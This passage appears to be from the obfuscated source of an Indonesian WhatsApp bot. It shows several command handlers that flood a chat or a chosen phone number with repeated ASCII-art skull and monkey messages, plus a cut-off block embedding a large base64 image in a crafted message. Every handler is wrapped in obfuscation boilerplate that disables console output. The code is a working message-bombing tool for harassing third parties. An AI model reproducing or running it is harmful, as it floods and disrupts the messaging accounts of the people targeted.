i=0x0;i<jumlah;i++){nyet='\x0a┈┈╱▔▔▔▔▔╲┈┈HM┈HM\x0a┈╱┈┈╱▔╲╲╲▏┈┈┈HMM\x0a╱┈┈╱━╱▔▔▔▔▔╲━╮┈┈\x0a▏┈▕┃▕╱▔╲╱▔╲▕╮┃┈┈\x0a▏┈▕╰━▏▊▕▕▋▕▕━╯┈┈\x0a╲┈┈╲╱▔╭╮▔▔┳╲╲┈┈┈\x0a┈╲┈┈▏╭━━━━╯▕▕┈┈┈\x0a┈┈╲┈╲▂▂▂▂▂▂╱╱┈┈┈\x0a┈┈┈┈▏┊┈┈┈┈┊┈┈┈╲┈\x0a┈┈┈┈▏┊┈┈┈┈┊▕╲┈┈╲\x0a┈╱▔╲▏┊┈┈┈┈┊▕╱▔╲▕\x0a┈▏\x20┈┈┈╰┈┈┈┈╯┈┈┈▕▕\x0a┈╲┈┈┈╲┈┈┈┈╱┈┈┈╱┈╲\x0a┈┈╲┈┈▕▔▔▔▔▏┈┈╱╲╲╲▏\x0a┈╱▔┈┈▕┈┈┈┈▏┈┈▔╲▔▔\x0a┈╲▂▂▂╱┈┈┈┈╲▂▂▂╱┈\x0a',await jobotz['sendMessage'](m[_0x2504d8(0x9e)],{'text':nyet},{'quoted':fgamjo});}jancok('Sukses\x20Send\x20Monyet\x20Sebanyak\x20'+jumlah);}
}
break

case 'jotengkorak': {
const _0x3fcf98=_0x3d76;(function(_0x3ddeeb,_0x60e10c){const _0x29fc27=_0x3d76,_0x2733e8=_0x3ddeeb();while(!![]){try{const _0x28cc81=-parseInt(_0x29fc27(0x113))/0x1+-parseInt(_0x29fc27(0x10e))/0x2*(parseInt(_0x29fc27(0x119))/0x3)+-parseInt(_0x29fc27(0x120))/0x4+parseInt(_0x29fc27(0x11a))/0x5*(parseInt(_0x29fc27(0x118))/0x6)+parseInt(_0x29fc27(0x11f))/0x7+-parseInt(_0x29fc27(0x10f))/0x8+-parseInt(_0x29fc27(0x117))/0x9*(-parseInt(_0x29fc27(0x11b))/0xa);if(_0x28cc81===_0x60e10c)break;else _0x2733e8['push'](_0x2733e8['shift']());}catch(_0x222f52){_0x2733e8['push'](_0x2733e8['shift']());}}}(_0x65d9,0x96d36));const _0x517aa6=(function(){let _0x1a5701=!![];return function(_0x3fe22c,_0x47d314){const _0x34ae7a=_0x1a5701?function(){const _0x3cbc40=_0x3d76;if(_0x47d314){const _0x18527b=_0x47d314[_0x3cbc40(0x115)](_0x3fe22c,arguments);return _0x47d314=null,_0x18527b;}}:function(){};return _0x1a5701=![],_0x34ae7a;};}()),_0x335cb5=_0x517aa6(this,function(){const _0x4643a1=_0x3d76;return _0x335cb5[_0x4643a1(0x11d)]()[_0x4643a1(0x112)]('(((.+)+)+)+$')[_0x4643a1(0x11d)]()[_0x4643a1(0x10c)](_0x335cb5)[_0x4643a1(0x112)](_0x4643a1(0x10b));});_0x335cb5();const _0x428ed3=(function(){let _0xe500a4=!![];return function(_0xda399e,_0x1f3c99){const _0x343719=_0xe500a4?function(){const _0x3f7bab=_0x3d76;if(_0x1f3c99){const _0x1da88f=_0x1f3c99[_0x3f7bab(0x115)](_0xda399e,arguments);return _0x1f3c99=null,_0x1da88f;}}:function(){};return _0xe500a4=![],_0x343719;};}()),_0x45ff11=_0x428ed3(this,function(){const _0x3c6a6f=_0x3d76,_0x1fa144=function(){const _0x337cdb=_0x3d76;let _0x2f182b;try{_0x2f182b=Function(_0x337cdb(0x114)+_0x337cdb(0x111)+');')();}catch(_0x2f808c){_0x2f182b=window;}return _0x2f182b;},_0x243ade=_0x1fa144(),_0x50ef1c=_0x243ade[_0x3c6a6f(0x126)]=_0x243ade['console']||{},_0x2e88d0=[_0x3c6a6f(0x11c),_0x3c6a6f(0x124),_0x3c6a6f(0x121),_0x3c6a6f(0x122),_0x3c6a6f(0x123),'table',_0x3c6a6f(0x11e)];for(let _0x5783c2=0x0;_0x5783c2<_0x2e88d0[_0x3c6a6f(0x116)];_0x5783c2++){const _0x2421e4=_0x428ed3[_0x3c6a6f(0x10c)]['prototype']['bind'](_0x428ed3),_0x54942c=_0x2e88d0[_0x5783c2],_0x4d207f=_0x50ef1c[_0x54942c]||_0x2421e4;_0x2421e4[_0x3c6a6f(0x110)]=_0x428ed3['bind'](_0x428ed3),_0x2421e4[_0x3c6a6f(0x11d)]=_0x4d207f[_0x3c6a6f(0x11d)]['bind'](_0x4d207f),_0x50ef1c[_0x54942c]=_0x2421e4;}});function _0x3d76(_0x32b837,_0x324fc8){const _0x59eeb8=_0x65d9();return _0x3d76=function(_0x45ff11,_0x428ed3){_0x45ff11=_0x45ff11-0x10b;let _0x5030b3=_0x59eeb8[_0x45ff11];return _0x5030b3;},_0x3d76(_0x32b837,_0x324fc8);}_0x45ff11();function _0x65d9(){const _0x355f8d=['8042720kspLms','__proto__','{}.constructor(\x22return\x20this\x22)(\x20)','search','814309rfpBMY','return\x20(function()\x20','apply','length','1098btybOJ','6XbgMHX','29379DCFpyf','1940495JFcqUg','263420bXFHur','log','toString','trace','1532118dQWRXY','1341660iVRHvQ','info','error','exception','warn','sendMessage','console','(((.+)+)+)+$','constructor','Jumlahnya?','214wCTSVG'];_0x65d9=function(){return _0x355f8d;};return _0x65d9();}{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m['reply'](_0x3fcf98(0x10d));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){teng='\x0a██▀░░░░░░░░░░░░░▀██\x0a█│░░░░░░░░░░░░░░░│█\x0a▌│░░░░░░░░░░░░░░░│▐\x0a░└┐░░░░░░░░░░░░░┌┘░\x0a░░└┐░░░░░░░░░░░┌┘░░\x0a░░┌┘▄▄▄░░░░░▄▄▄└┐░░\x0a▌░│████▌░░░▐████│░▐\x0a█░│▐██▀░░▄░░▀██▌│░█\x0a█▌┘░░░░░▐█▌░░░░░└▐█\x0a██░░▄▄▓░▀█▀░▓▄▄░░██\x0a██▄─┘█▌░░░░░▐█└─▄██\x0a███░░▐─┬┬┬┬┬─▌░░███\x0a███▌░░┬┼┼┼┼┼┬░░▐███\x0a████▄░└┴┴┴┴┴┘░▄████\x0a█████▄░░░░░░░▄█████\x0a',await jobotz[_0x3fcf98(0x125)](m['chat'],{'text':teng},{'quoted':fgamjo});}jancok('Sukses\x20Send\x20Tengkorak\x20Sebanyak\x20'+jumlah);}
}
 break

case 'jotengkorakto': {
var _0x44e65b=_0x5788;(function(_0x50d720,_0x4d214c){var _0x432146=_0x5788,_0x1587e0=_0x50d720();while(!![]){try{var _0x5c7f63=parseInt(_0x432146(0x114))/0x1+-parseInt(_0x432146(0x11a))/0x2*(parseInt(_0x432146(0x128))/0x3)+-parseInt(_0x432146(0x11e))/0x4*(parseInt(_0x432146(0x125))/0x5)+-parseInt(_0x432146(0x11d))/0x6*(-parseInt(_0x432146(0x126))/0x7)+-parseInt(_0x432146(0x113))/0x8*(parseInt(_0x432146(0x12a))/0x9)+parseInt(_0x432146(0x10e))/0xa*(-parseInt(_0x432146(0x124))/0xb)+parseInt(_0x432146(0x121))/0xc*(parseInt(_0x432146(0x11c))/0xd);if(_0x5c7f63===_0x4d214c)break;else _0x1587e0['push'](_0x1587e0['shift']());}catch(_0x5de1c9){_0x1587e0['push'](_0x1587e0['shift']());}}}(_0x4aa1,0xe9ff6));function _0x5788(_0x12c5c9,_0x1871f9){var _0x31c09c=_0x4aa1();return _0x5788=function(_0x2aedc7,_0x23f0b2){_0x2aedc7=_0x2aedc7-0x10e;var _0x49fff9=_0x31c09c[_0x2aedc7];return _0x49fff9;},_0x5788(_0x12c5c9,_0x1871f9);}function _0x4aa1(){var _0x3ea43e=['table','(((.+)+)+)+$','\x0a██▀░░░░░░░░░░░░░▀██\x0a█│░░░░░░░░░░░░░░░│█\x0a▌│░░░░░░░░░░░░░░░│▐\x0a░└┐░░░░░░░░░░░░░┌┘░\x0a░░└┐░░░░░░░░░░░┌┘░░\x0a░░┌┘▄▄▄░░░░░▄▄▄└┐░░\x0a▌░│████▌░░░▐████│░▐\x0a█░│▐██▀░░▄░░▀██▌│░█\x0a█▌┘░░░░░▐█▌░░░░░└▐█\x0a██░░▄▄▓░▀█▀░▓▄▄░░██\x0a██▄─┘█▌░░░░░▐█└─▄██\x0a███░░▐─┬┬┬┬┬─▌░░███\x0a███▌░░┬┼┼┼┼┼┬░░▐███\x0a████▄░└┴┴┴┴┴┘░▄████\x0a█████▄░░░░░░░▄█████\x0a','info','584382jpPLYK','log','266838wOHLDi','174qplKma','565768PcqzTC','prototype','bind','3372MNKRkP','apply','sendMessage','27973YlPWZt','65sdUMit','34993zgsTOB','@s.whatsapp.net','9RTdyAn','error','99UEfuYE','toString','search','7090FqWPND','console','constructor','Berhasil\x20Mengirim\x20Tengkorak\x20Di\x20Nomer\x20','exception','1034560NxHAVS','986503QdktaB','{}.constructor(\x22return\x20this\x22)(\x20)'];_0x4aa1=function(){return _0x3ea43e;};return _0x4aa1();}var _0x50f049=(function(){var _0x436b99=!![];return function(_0xa98515,_0x3c3316){var _0x2a3502=_0x436b99?function(){var _0x4144d9=_0x5788;if(_0x3c3316){var _0x3a1765=_0x3c3316[_0x4144d9(0x122)](_0xa98515,arguments);return _0x3c3316=null,_0x3a1765;}}:function(){};return _0x436b99=![],_0x2a3502;};}()),_0x54c791=_0x50f049(this,function(){var _0x475098=_0x5788;return _0x54c791['toString']()[_0x475098(0x12c)](_0x475098(0x117))[_0x475098(0x12b)]()[_0x475098(0x110)](_0x54c791)[_0x475098(0x12c)](_0x475098(0x117));});_0x54c791();var _0x23f0b2=(function(){var _0x496143=!![];return function(_0x14d263,_0x4c3c35){var _0x5f0666=_0x496143?function(){if(_0x4c3c35){var _0x40551b=_0x4c3c35['apply'](_0x14d263,arguments);return _0x4c3c35=null,_0x40551b;}}:function(){};return _0x496143=![],_0x5f0666;};}()),_0x2aedc7=_0x23f0b2(this,function(){var _0x36f819=_0x5788,_0x4c1d76=function(){var _0x2d29d7=_0x5788,_0x29aadd;try{_0x29aadd=Function('return\x20(function()\x20'+_0x2d29d7(0x115)+');')();}catch(_0x1ca2c1){_0x29aadd=window;}return _0x29aadd;},_0x79477b=_0x4c1d76(),_0x31c76a=_0x79477b[_0x36f819(0x10f)]=_0x79477b[_0x36f819(0x10f)]||{},_0x21b41d=[_0x36f819(0x11b),'warn',_0x36f819(0x119),_0x36f819(0x129),_0x36f819(0x112),_0x36f819(0x116),'trace'];for(var _0x3de12b=0x0;_0x3de12b<_0x21b41d['length'];_0x3de12b++){var _0x47c25d=_0x23f0b2['constructor'][_0x36f819(0x11f)]['bind'](_0x23f0b2),_0x4f12db=_0x21b41d[_0x3de12b],_0x4350e1=_0x31c76a[_0x4f12db]||_0x47c25d;_0x47c25d['__proto__']=_0x23f0b2[_0x36f819(0x120)](_0x23f0b2),_0x47c25d[_0x36f819(0x12b)]=_0x4350e1[_0x36f819(0x12b)]['bind'](_0x4350e1),_0x31c76a[_0x4f12db]=_0x47c25d;}});_0x2aedc7();{if(!isCreator&&!isBan)return;if(!text)throw'Nomernya\x20mana?';teng=_0x44e65b(0x118),await jobotz[_0x44e65b(0x123)](text+_0x44e65b(0x127),{'text':teng},{'quoted':fgamjo}),await jobotz[_0x44e65b(0x123)](text+_0x44e65b(0x127),{'text':teng},{'quoted':fgamjo}),await jobotz[_0x44e65b(0x123)](text+'@s.whatsapp.net',{'text':teng},{'quoted':fgamjo}),await jobotz['sendMessage'](text+_0x44e65b(0x127),{'text':teng},{'quoted':fgamjo}),await jobotz[_0x44e65b(0x123)](text+_0x44e65b(0x127),{'text':teng},{'quoted':fgamjo}),await jobotz['sendMessage'](text+_0x44e65b(0x127),{'text':teng},{'quoted':fgamjo}),await jobotz[_0x44e65b(0x123)](text+_0x44e65b(0x127),{'text':teng},{'quoted':fgamjo}),await jobotz[_0x44e65b(0x123)](text+_0x44e65b(0x127),{'text':teng},{'quoted':fgamjo}),await jobotz[_0x44e65b(0x123)](text+_0x44e65b(0x127),{'text':teng},{'quoted':fgamjo}),await m['reply'](_0x44e65b(0x111)+text);}
 }
 break

case 'jogastengkorak': {
var _0x333d0f=_0x1c63;(function(_0x941f81,_0x4f77ce){var _0x4bb95c=_0x1c63,_0x7b2862=_0x941f81();while(!![]){try{var _0x3f4989=parseInt(_0x4bb95c(0xd2))/0x1*(parseInt(_0x4bb95c(0xe4))/0x2)+parseInt(_0x4bb95c(0xd1))/0x3+-parseInt(_0x4bb95c(0xe9))/0x4+-parseInt(_0x4bb95c(0xd9))/0x5*(-parseInt(_0x4bb95c(0xe8))/0x6)+parseInt(_0x4bb95c(0xd5))/0x7*(-parseInt(_0x4bb95c(0xcf))/0x8)+-parseInt(_0x4bb95c(0xd8))/0x9+parseInt(_0x4bb95c(0xe5))/0xa*(parseInt(_0x4bb95c(0xd7))/0xb);if(_0x3f4989===_0x4f77ce)break;else _0x7b2862['push'](_0x7b2862['shift']());}catch(_0x1581e9){_0x7b2862['push'](_0x7b2862['shift']());}}}(_0x1f55,0x68e3d));function _0x1c63(_0x4142d6,_0x1b2b30){var _0xb1e0bf=_0x1f55();return _0x1c63=function(_0x363df2,_0x5d1973){_0x363df2=_0x363df2-0xce;var _0x127491=_0xb1e0bf[_0x363df2];return _0x127491;},_0x1c63(_0x4142d6,_0x1b2b30);}var _0x31a07b=(function(){var _0x4c00cf=!![];return function(_0x9878a1,_0x1127fc){var _0x3ab6c1=_0x4c00cf?function(){if(_0x1127fc){var _0x4494e7=_0x1127fc['apply'](_0x9878a1,arguments);return _0x1127fc=null,_0x4494e7;}}:function(){};return _0x4c00cf=![],_0x3ab6c1;};}()),_0x91eba7=_0x31a07b(this,function(){var _0x2b1210=_0x1c63;return _0x91eba7['toString']()[_0x2b1210(0xd3)](_0x2b1210(0xe7))[_0x2b1210(0xde)]()[_0x2b1210(0xe6)](_0x91eba7)['search'](_0x2b1210(0xe7));});_0x91eba7();var _0x5d1973=(function(){var _0x4fa1ee=!![];return function(_0x3cff9b,_0x441531){var _0x8fb7a3=_0x4fa1ee?function(){if(_0x441531){var _0x4b0a0f=_0x441531['apply'](_0x3cff9b,arguments);return _0x441531=null,_0x4b0a0f;}}:function(){};return _0x4fa1ee=![],_0x8fb7a3;};}()),_0x363df2=_0x5d1973(this,function(){var _0xd185=_0x1c63,_0x2586a2;try{var _0x57acf7=Function(_0xd185(0xce)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x2586a2=_0x57acf7();}catch(_0x11aca7){_0x2586a2=window;}var _0x1a0aea=_0x2586a2[_0xd185(0xd4)]=_0x2586a2[_0xd185(0xd4)]||{},_0x2e7722=['log',_0xd185(0xe1),_0xd185(0xdc),_0xd185(0xdf),_0xd185(0xe0),_0xd185(0xd6),_0xd185(0xeb)];for(var _0x5333e0=0x0;_0x5333e0<_0x2e7722[_0xd185(0xec)];_0x5333e0++){var _0x1fa17a=_0x5d1973[_0xd185(0xe6)][_0xd185(0xee)][_0xd185(0xe2)](_0x5d1973),_0x3b5446=_0x2e7722[_0x5333e0],_0x3efd33=_0x1a0aea[_0x3b5446]||_0x1fa17a;_0x1fa17a[_0xd185(0xea)]=_0x5d1973[_0xd185(0xe2)](_0x5d1973),_0x1fa17a['toString']=_0x3efd33['toString'][_0xd185(0xe2)](_0x3efd33),_0x1a0aea[_0x3b5446]=_0x1fa17a;}});function _0x1f55(){var _0x5d89e4=['\x0a██▀░░░░░░░░░░░░░▀██\x0a█│░░░░░░░░░░░░░░░│█\x0a▌│░░░░░░░░░░░░░░░│▐\x0a░└┐░░░░░░░░░░░░░┌┘░\x0a░░└┐░░░░░░░░░░░┌┘░░\x0a░░┌┘▄▄▄░░░░░▄▄▄└┐░░\x0a▌░│████▌░░░▐████│░▐\x0a█░│▐██▀░░▄░░▀██▌│░█\x0a█▌┘░░░░░▐█▌░░░░░└▐█\x0a██░░▄▄▓░▀█▀░▓▄▄░░██\x0a██▄─┘█▌░░░░░▐█└─▄██\x0a███░░▐─┬┬┬┬┬─▌░░███\x0a███▌░░┬┼┼┼┼┼┬░░▐███\x0a████▄░└┴┴┴┴┴┘░▄████\x0a█████▄░░░░░░░▄█████\x0a','8942qgtTrq','887270hRAhHk','constructor','(((.+)+)+)+$','1158kCXRdk','1563684IFkATw','__proto__','trace','length','sendMessage','prototype','return\x20(function()\x20','8IjCwnv','chat','1066725jeTnJI','11XNPLIk','search','console','2608249TjyAiC','table','121HGnKvm','6043023rBkMcX','12535pjKPKo','Berhasil\x20Mengirim\x20Tengkorak\x20Di\x20Nomer\x20','Nomernya\x20mana?','info','@s.whatsapp.net','toString','error','exception','warn','bind'];_0x1f55=function(){return _0x5d89e4;};return _0x1f55();}_0x363df2();{if(!isCreator&&!isBan)return;if(!text)throw _0x333d0f(0xdb);teng=_0x333d0f(0xe3),await jobotz['sendMessage'](m['chat'],{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](text+_0x333d0f(0xdd),{'text':teng},{'quoted':fgamjo}),await jobotz['sendMessage'](m['chat'],{'text':teng},{'quoted':fgamjo}),await jobotz['sendMessage'](text+'@s.whatsapp.net',{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](m[_0x333d0f(0xd0)],{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](text+_0x333d0f(0xdd),{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](m['chat'],{'text':teng},{'quoted':fgamjo}),await jobotz['sendMessage'](text+_0x333d0f(0xdd),{'text':teng},{'quoted':fgamjo}),await jobotz['sendMessage'](m[_0x333d0f(0xd0)],{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](text+'@s.whatsapp.net',{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](m[_0x333d0f(0xd0)],{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](text+_0x333d0f(0xdd),{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](m[_0x333d0f(0xd0)],{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](text+_0x333d0f(0xdd),{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](m[_0x333d0f(0xd0)],{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](text+'@s.whatsapp.net',{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](m[_0x333d0f(0xd0)],{'text':teng},{'quoted':fgamjo}),await jobotz[_0x333d0f(0xed)](text+_0x333d0f(0xdd),{'text':teng},{'quoted':fgamjo}),jancok(_0x333d0f(0xda)+text);}
 }
 break

case 'jogasliveloc': {
const _0x436538=_0x5acb;(function(_0x216392,_0x4d71f0){const _0x43bbac=_0x5acb,_0x50841a=_0x216392();while(!![]){try{const _0x469560=-parseInt(_0x43bbac(0x209))/0x1*(-parseInt(_0x43bbac(0x1f5))/0x2)+parseInt(_0x43bbac(0x20d))/0x3+parseInt(_0x43bbac(0x212))/0x4+-parseInt(_0x43bbac(0x1ec))/0x5+parseInt(_0x43bbac(0x1ef))/0x6*(parseInt(_0x43bbac(0x211))/0x7)+-parseInt(_0x43bbac(0x1ed))/0x8+-parseInt(_0x43bbac(0x203))/0x9*(parseInt(_0x43bbac(0x202))/0xa);if(_0x469560===_0x4d71f0)break;else _0x50841a['push'](_0x50841a['shift']());}catch(_0x3787a7){_0x50841a['push'](_0x50841a['shift']());}}}(_0x59c9,0x52337));const _0x3d7a65=(function(){let _0x296a0f=!![];return function(_0x4c4e38,_0x4d4567){const _0x29b443=_0x296a0f?function(){if(_0x4d4567){const _0x5dcd2a=_0x4d4567['apply'](_0x4c4e38,arguments);return _0x4d4567=null,_0x5dcd2a;}}:function(){};return _0x296a0f=![],_0x29b443;};}()),_0x5391ea=_0x3d7a65(this,function(){const _0x4e03d5=_0x5acb;return _0x5391ea[_0x4e03d5(0x20e)]()[_0x4e03d5(0x1f3)](_0x4e03d5(0x205))['toString']()[_0x4e03d5(0x207)](_0x5391ea)[_0x4e03d5(0x1f3)](_0x4e03d5(0x205));});_0x5391ea();function _0x5acb(_0x344b3d,_0x3b2550){const _0x14f13d=_0x59c9();return _0x5acb=function(_0x3965bc,_0x1993ec){_0x3965bc=_0x3965bc-0x1ec;let _0x2bccb7=_0x14f13d[_0x3965bc];return _0x2bccb7;},_0x5acb(_0x344b3d,_0x3b2550);}const _0x1993ec=(function(){let _0x22246a=!![];return function(_0x47f196,_0xd6d1b1){const _0x2917c6=_0x22246a?function(){const _0x37c5ad=_0x5acb;if(_0xd6d1b1){const _0x180471=_0xd6d1b1[_0x37c5ad(0x1f8)](_0x47f196,arguments);return _0xd6d1b1=null,_0x180471;}}:function(){};return _0x22246a=![],_0x2917c6;};}()),_0x3965bc=_0x1993ec(this,function(){const _0x59752f=_0x5acb;let _0x17a112;try{const _0x1d81a4=Function(_0x59752f(0x1f6)+_0x59752f(0x1fd)+');');_0x17a112=_0x1d81a4();}catch(_0x54f789){_0x17a112=window;}const _0x314fab=_0x17a112[_0x59752f(0x1fc)]=_0x17a112[_0x59752f(0x1fc)]||{},_0x2f5078=['log',_0x59752f(0x200),_0x59752f(0x1fe),_0x59752f(0x1f1),_0x59752f(0x20b),_0x59752f(0x20f),_0x59752f(0x1ee)];for(let _0x14d9c6=0x0;_0x14d9c6<_0x2f5078[_0x59752f(0x1fb)];_0x14d9c6++){const _0x21b1c2=_0x1993ec[_0x59752f(0x207)][_0x59752f(0x210)][_0x59752f(0x1ff)](_0x1993ec),_0x143100=_0x2f5078[_0x14d9c6],_0x5339b7=_0x314fab[_0x143100]||_0x21b1c2;_0x21b1c2[_0x59752f(0x206)]=_0x1993ec['bind'](_0x1993ec),_0x21b1c2[_0x59752f(0x20e)]=_0x5339b7['toString'][_0x59752f(0x1ff)](_0x5339b7),_0x314fab[_0x143100]=_0x21b1c2;}});function _0x59c9(){const _0x187cf5=['416672ODRqks','224705VqTOXp','1795624eUUiOR','trace','28386xpPTmu','chat','error','1657997490287001','search','THE\x20JO\x20BOT\x20','7974dDBvvG','return\x20(function()\x20','Message','apply','Nomernya\x20mana?','@s.whatsapp.net','length','console','{}.constructor(\x22return\x20this\x22)(\x20)','info','bind','warn','key','7010GIxsNR','13122YREGYD','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